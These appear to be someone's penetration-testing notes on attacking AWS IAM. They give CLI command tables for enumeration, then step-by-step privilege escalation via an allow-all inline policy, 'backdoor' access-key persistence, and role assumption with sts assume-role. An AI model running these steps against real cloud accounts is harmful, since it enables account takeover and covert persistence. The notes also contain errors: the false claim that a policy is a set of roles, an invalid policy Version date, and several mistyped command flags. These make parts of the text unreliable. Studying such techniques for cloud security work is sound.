# IAM - Identity and Access Management

- IAM basically defines who can access what resources (Admin has access to all services - Engineer has access to labmda, DynamoDB and S3 - Testers can acecss S3 only)
- Whoever is trying to access a resource on the cloud is called a "Principle". a Principle needs to be authenticated and sends a request to the resource with what actions/operations  they intendes to do. These operations/actions has to no violate the IAM policies enforced (a policy does allow that principle to access the resource--> Authorization)
- A Principle can be a IAM User, Root User or an IAM Role
- A Role defines set of perms for making AWS requests
- A Policy is a set of Roles
- A request contains the following:
	- Action/Operation (Ex: aws s3 list, ...)
	- Resource to be accessed
	- Principle 
	- Environment
	- Resource Data
- IAM Group is a collection of IAM Users and can be used to apply policies on multiple users at once.
- IAM Users can be a part of multiple groups
- IAM STS (Security Token Service): web service that allows you to request temp, limited privilege creds for an IAM user. It gives temp access to a resource using a token
- the temp creds contain: Access Key ID, Secret Access Key, Security Token

### Temp Creds

- STS --> Applicable on Users or other AWS account users / services
- AWS Metadata --> http://169.254.169.254 (IAM Roles - Same AWS account)

# Enumeration

To exploit IAM misconfigurations we first need to enumerate a few things like users, groups, roles and policies attached to certain users

### User Enumeration

| Description | Command |
| --- | --- |
| Retrieve the user/service/rolename and ID related to a compromised key | `aws sts get-caller-identity` |
| List IAM Users | `aws iam list-users` |
| List IAM Groups for a specified user | `aws iam list-groups-for-user --user-name <username>` |
| List all managed policies attached to a specified user | `aws iam list-attached-user-policies --user-name <username>` |
| List all inline policies embedded to a specified user | `aws iam list-user-policies --user-name <username>` | 

---

### Group Enumeration

Description | Command
--- | ---
List all IAM Groups | `aws iam list-groups`
List all managed policies attached to a specified group | `aws iam list-attached-group-polocies --group-name <GroupName>`
List all inline policies attached to a specified group | `aws iam list-group-policies --group-name <GroupName>` 

---
### Role Enumeration

Description | Command
--- | ---
List all IAM Roles | `aws iam list-roles`
List all managed policies attached to a specified role | `aws iam list-attached-role-policies --role-name <RoleName>`
List all inline policies attached to a specified role | `aws iam list-role-policies --role-name <RoleName>` 

---
### Policy Enumeration

Description | Command
--- | ---
List all IAM Policies | `aws iam list-policies`
Retrieve info about a specified managed policy | `aws iam get-policy --policy-arn <Policy-ARN>`
Retrieve info about the version of a specified managed policy | `aws iam list-policy-versions --policy-arn <Policy-ARN>`
Get the permissions granted to a specific version of a managed policy | `aws iam get-policy-version --policy-arn <Policy-ARN> --version-id v1`
List Inline Policies applied on a certain User/Group/Role | `aws iam list-[group/role/user]-policies --group/role/user-name <Name>`
Get inline policy embedded on a IAM User | `aws iam get-user-policy --user-name <UName> --policy-name <PName>`
Get inline policy embedded on a IAM Group | `aws iam get-group-policy --group-name <GName> --policy-name <PName>`
Get inline policy embedded on a IAM Role | `aws iam get-role-policy --rolename-name <RName> --policy-name <PName>`

# Privesc

Assume that you compromised a user with limited rights but has an attached policy that grants him `PutUserPolicy` action. That means that this low-priv user can add inline policies to any other user (himself included), so, he can easily attach a policy to himself that allows the account to execute all actions on all the resources (Administrator Policy)

1. Create a policy to be attached:

```json
{
	"Version": "2022-9-15",
		"Statement": [
			{
				"Effect": "Allow",
				"Action": [
						"*"
				],
				"Resource": [
						"*"
				]
			}
		
		]
}
```

2. Attach the policy to your user:
`aws iam put-user-policy --username <UName> --policy-name <PName> --policy-document file://Policy.json`

3. Verify that it is attached using `aws iam list-user-policies --username <UName>`

### More Permission Exploits

# Persistence

Suppose you have compromised `UserA`, which is a high-priv user and got his secret and access key, you can then request a new access key for another low-priv user, `UserB`, that is less likely to be monitored for persistence. This is helpful in case the original access key was disabled, we still can use our own "backdoor" access key. 
You can also create a new user and assign an access key to them

**Note:** Every user can have 2 access keys at the same time

- Create a new for a IAM User: `aws iam create-access-key --user-name <UName>`

---
# Credentialed Attacks

- If a low-priv compromised user has the `STS-AssumeRolePermission` Policy attached to it, they can assume roles if their ARN does exist as a trusted object in the assumed end of the relation
- In other words, you'll find that the target role has a policy named `AssumeRole` with the principle of the compromised user enlisted in it. that means you can levrege the `STS-AssumeRolePermission` to assume the privilege role you want 


### A. Detection Steps
1. Check the policies attached to your user: `aws iam list-attached-user-policies --user-name <UName>`
2. If one of the policies has the `sts:AssumeRole` action, that means you can assume the roles specified in the <code style='color:red'>Resource</code> section
3. Note that you can assume the rules you want if and only if your ARN is listed in a trusted relationship with the role you are targeting
4. You can find out who is allowed to assume a role by listing the roles (<code style='color:red'>aws iam list-roles</code>) and checking the <code style='color:red'>Principal</code> section  
5. You can get information about the role to be assumed using `aws iam get-role --role-name <RoleName>`
6. Now that we know the user that can assume `Roles` and we know the `Roles` that could be assumed, we need to know the `Policies` that these roles contain using `aws iam list-attached-role-policies --role-name <RoleName>` then `aws iam get-policy-version --policy-arn <PArn> --version-id <VId>`

## B. Exploitation Steps
1. The attack begins by requesting a temp token for the privileged role and once you recieve it you can use it to access the resources given to you by the assumed role 
2. Retrieve a temp credentials --> `aws sts assume-role --role-arn <RoleARN> --role-session-name awscli --profile lowpriv`
3. we will need to save the data in the following env variables to use it 
	- `export AWS_ACCESS_KEY_ID=*Redacted*`
	- `export AWS_SECRET_ACCESS_KEY=*Redacted*`
	- `export AWS_SESSION_TOKEN=*Redacted*`
4. Run `aws sts get-caller-identity` to confirm that you've assumed the new role 

---
- `Trust Policy` defines which entities are allowed to assume a role
- `Permission Policy` defines which AWS resource a role is allowed to access and the actions allowed to be performed on this resource
- `AWS Lambda` logs history to `AWS CloudWatch Logs` by assuming an iAM role
